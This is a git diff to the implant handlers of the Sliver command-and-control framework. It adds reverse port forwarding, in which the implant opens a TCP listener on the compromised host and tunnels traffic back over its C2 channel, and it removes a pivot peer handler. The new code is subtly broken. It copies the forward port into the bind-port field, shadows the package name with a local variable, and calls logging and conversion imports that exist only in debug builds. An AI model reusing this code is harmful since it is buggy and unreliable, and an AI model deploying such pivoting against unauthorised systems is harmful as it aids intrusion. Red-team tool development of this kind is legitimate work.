@@ -21,9 +21,14 @@ package handlers
 import (
 	// {{if .Config.Debug}}
 	"log"
+	"strconv"
+	"time"
+
 	// {{end}}
+
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
-	"github.com/bishopfox/sliver/implant/sliver/rportfwd"
+	rportfwd "github.com/bishopfox/sliver/implant/sliver/rportfwd"
+	"github.com/bishopfox/sliver/implant/sliver/tcpproxy"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -45,16 +50,28 @@ func GetRportFwdHandlers() map[uint32]RportFwdHandler {
 }
 
 func rportFwdListenersHandler(envelope *pb.Envelope, connection *transports.Connection) {
-	data, _ := proto.Marshal(&pb.PivotListeners{
-		Listeners: rportfwd.GetListeners(),
+
+	forwards := rportfwd.Portfwds.List()
+	var portfwdListeners []*pb.RportFwdListener
+
+	for _, portfwd := range forwards {
+
+		portfwdListeners = append(portfwdListeners, &pb.RportFwdListener{
+			ID:             uint32(portfwd.ID),
+			BindAddress:    portfwd.BindAddr,
+			ForwardAddress: portfwd.RemoteAddr,
+		})
+	}
+	data, _ := proto.Marshal(&pb.RportFwdListeners{
+		Listeners: portfwdListeners,
 		Response:  &commonpb.Response{},
 	})
 	connection.Send <- &pb.Envelope{
 		ID:   envelope.ID,
 		Data: data,
 	}
-}
 
+}
 func rportFwdStartListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
 	req := &pb.RportFwdStartListenerReq{}
 	resp := &pb.RportFwdListener{Response: &commonpb.Response{}}
@@ -69,34 +86,36 @@ func rportFwdStartListenerHandler(envelope *pb.Envelope, connection *transports.
 		return
 	}
 
-	listener, err := createRportFwdListener(req.BindAddress, req.BindPort, req.ForwardAddress, req.ForwardPort)
-
-	if createListener, ok := pivots.SupportedPivotListeners[req.Type]; ok {
-		listener, err := createListener(req.BindAddress, connection.Send, req.Options...)
-		if err != nil {
-			resp.Response.Err = err.Error()
-			data, _ := proto.Marshal(resp)
-			connection.Send <- &pb.Envelope{
-				ID:   envelope.ID,
-				Data: data,
-			}
-			return
-		}
-		go listener.Start()
-		pivots.AddListener(listener)
-		data, _ := proto.Marshal(listener.ToProtobuf())
-		connection.Send <- &pb.Envelope{
-			ID:   envelope.ID,
-			Data: data,
-		}
-	} else {
-		resp.Response.Err = "Unsupported pivot listener type"
-		data, _ := proto.Marshal(resp)
-		connection.Send <- &pb.Envelope{
-			ID:   envelope.ID,
-			Data: data,
-		}
+	tcpProxy := &tcpproxy.Proxy{}
+	channelProxy := &rportfwd.ChannelProxy{
+		Conn:            connection,
+		RemoteAddr:      req.ForwardAddress + ":" + strconv.Itoa((int)(req.ForwardPort)),
+		BindAddr:        req.BindAddress + ":" + strconv.Itoa((int)(req.BindPort)),
+		KeepAlivePeriod: 60 * time.Second,
+		DialTimeout:     30 * time.Second,
 	}
+	tcpProxy.AddRoute(req.BindAddress+":"+strconv.Itoa((int)(req.BindPort)), channelProxy)
+	rportfwd := rportfwd.Portfwds.Add(tcpProxy, channelProxy)
+
+	go func() {
+		err := tcpProxy.Run()
+		if err != nil {
+			log.Printf("Proxy error %s", err)
+		}
+	}()
+	resp.BindAddress = req.BindAddress
+	resp.ForwardAddress = req.ForwardAddress
+	resp.BindPort = req.ForwardPort
+	resp.ForwardPort = req.ForwardPort
+	resp.ID = uint32(rportfwd.ID)
+
+	data, _ := proto.Marshal(resp)
+	connection.Send <- &pb.Envelope{
+		ID:   envelope.ID,
+		Data: data,
+	}
+	return
+	//con.PrintInfof("Port forwarding %s -> %s:%s\n", bindAddr, remoteHost, remotePort)
 }
 
 func rportFwdStopListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
@@ -117,27 +136,5 @@ func rportFwdStopListenerHandler(envelope *pb.Envelope, connection *transports.C
 	connection.Send <- &pb.Envelope{
 		ID:   envelope.ID,
 		Data: []byte{},
-	}
-}
-
-func pivotPeerEnvelopeHandler(envelope *pb.Envelope, connection *transports.Connection) {
-	sent, err := pivots.SendToPeer(envelope)
-	if !sent {
-		// {{if .Config.Debug}}
-		log.Printf("Send to peer failed, report peer failure upstream ...")
-		// {{end}}
-		errStr := ""
-		if err != nil {
-			errStr = err.Error()
-		}
-		data, _ := proto.Marshal(&pb.PivotPeerFailure{
-			PeerID: pivots.MyPeerID,
-			Type:   pb.PeerFailureType_SEND_FAILURE,
-			Err:    errStr,
-		})
-		connection.Send <- &pb.Envelope{
-			Type: pb.MsgPivotPeerFailure,
-			Data: data,
-		}
 	}
 }
